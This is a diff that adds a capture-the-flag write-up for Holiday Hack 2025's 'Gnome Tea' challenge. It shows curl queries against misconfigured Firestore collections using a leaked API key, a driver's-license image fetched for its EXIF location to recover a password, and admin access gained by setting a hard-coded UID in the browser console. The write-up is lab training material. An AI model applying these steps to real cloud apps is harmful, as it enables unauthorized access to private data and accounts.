@@ -20,28 +20,90 @@ High level executive summary of how the objective was solved. Details belong in 
 <details>
 <summary>Click to expand</summary>
 
-Step by step solution complete with any code used
+Using Edge's developer tools, the application code is reviewed. An interesting comment is found on the page:
   
-![Sample image alt text](/images/objectivename_purpose.jpg) 
+![Interesting Comment](/images/act3_gnometea_interestingcomment.jpg) 
 
+The API key is part of the URL:
 
-```sh
-bash script code block
+https://holidayhack2025.firebaseapp.com/__/auth/iframe?apiKey=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk&appName=%5BDEFAULT%5D&v=11.10.0&eid=p&usegapi=1&jsh=m%3B%2F_%2Fscs%2Fabc-static%2F_%2Fjs%2Fk%3Dgapi.lb.en.W5qDlPExdtA.O%2Fd%3D1%2Frs%3DAHpOoo8JInlRP_yLzwScb00AozrrUS6gJg%2Fm%3D__features__
+
+apiKey=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk
+
+Using Burp, the configuration is retreived:
+
+const OP={apiKey:"AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk",authDomain:"holidayhack2025.firebaseapp.com",projectId:"holidayhack2025",storageBucket:"holidayhack2025.firebasestorage.app",messagingSenderId:"341227752777",appId:"1:341227752777:web:7b9017d3d2d83ccf481e98"},
+
+Following the comment in the page code, let's see what collections are accessible:
+
+curl -X GET \
+  https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/dms?key=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk
+
+Collection contains messages, gnome names, and sender UIDS
+
+curl -X GET \
+  https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/tea?key=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk
+Contains avatars, authids, 
+
+curl -X GET \
+https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/gnomes?key=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk
+
+contains email addresses, notes and jpeg pictures
+
+Looking in the dms collection contains a lot of messages. Searching for the string "password" reveals that Barnaby's image file contains location data that will identify his password.
+
+curl -X GET \
+  https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/dms?key=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk | grep "password"
+
+![Password Hint](/images/act3_gnometea_password.jpg) 
+
+Searching the gnomes collection reveals Barnabies email address. This is needed for login.
+
+![Barnaby's Username](/images/act3_gnometea_username.jpg) 
+
+**Username: barnabybriefcase@gnomemail.dosis:barnabybriefcase@gnomemail.dosis**
+
+The correct URL to obtain Barnaby's image is: https://firebasestorage.googleapis.com/v0/b/holidayhack2025.firebasestorage.app/o/gnome-documents%2Fl7VS01K9GKV5ir5S8suDcwOFEpp2_drivers_license.jpeg
+
+curl "https://firebasestorage.googleapis.com/v0/b/holidayhack2025.firebasestorage.app/o/gnome-documents%2Fl7VS01K9GKV5ir5S8suDcwOFEpp2_drivers_license.jpeg?alt=media" -o drivers_license.jpeg
+
+![Image Exifdata](/images/act3_gnometea_exifdata.jpg) 
+
+The image was taken at: 33 deg 27' 53.85" S, 115 deg 54' 37.62" E
+
+Converting the Latitude and Longitude into a format for Google Maps:
+
+https://www.google.com/maps?q=-33.464958,115.910450
+
+![Barnaby's Password](/images/act3_gnometea_password.jpg) 
+
+With valid credentials, login is achieved as Barnaby.
+
+![Gnome Tea Login](/images/act3_gnometea_login.jpg) 
+
+Following the hint about client side controls, the source code now available is reviewed, and admin access is hard coded into the source.
+
+```javascript
+    const [r,e] = K.useState({
+        totalGnomes: 0,
+        totalTea: 0,
+        totalDMs: 0
+    })
+      , [t,s] = K.useState(!0)
+      , [o,l] = K.useState(null)
+      , [h,f] = K.useState(!1)
+      , [m,v] = K.useState(!1)
+      , {user: _} = _l()
+      , T = "3loaihgxP0VwCTKmkHHFLe6FZ4m2";
+    typeof window < "u" && (window.EXPECTED_ADMIN_UID = T),
+
 ```
 
-Ordered list:
-1. Item 1
-2. Item 2
-3. Item 3
+Using the console in Edge's developer tools, admin access is achieved by setting T to 3loaihgxP0VwCTKmkHHFLe6FZ4m2
 
-Unordered list:
+![Gnome Tea Solution](/images/act3_gnometea_solution.jpg) 
 
-- Item
-- Item
-- Item
-/usr/local/weather/temperature
-
-**Answer: Flag or Answer**
+**Answer: GigGigglesGiggler**
 
 </details>
 
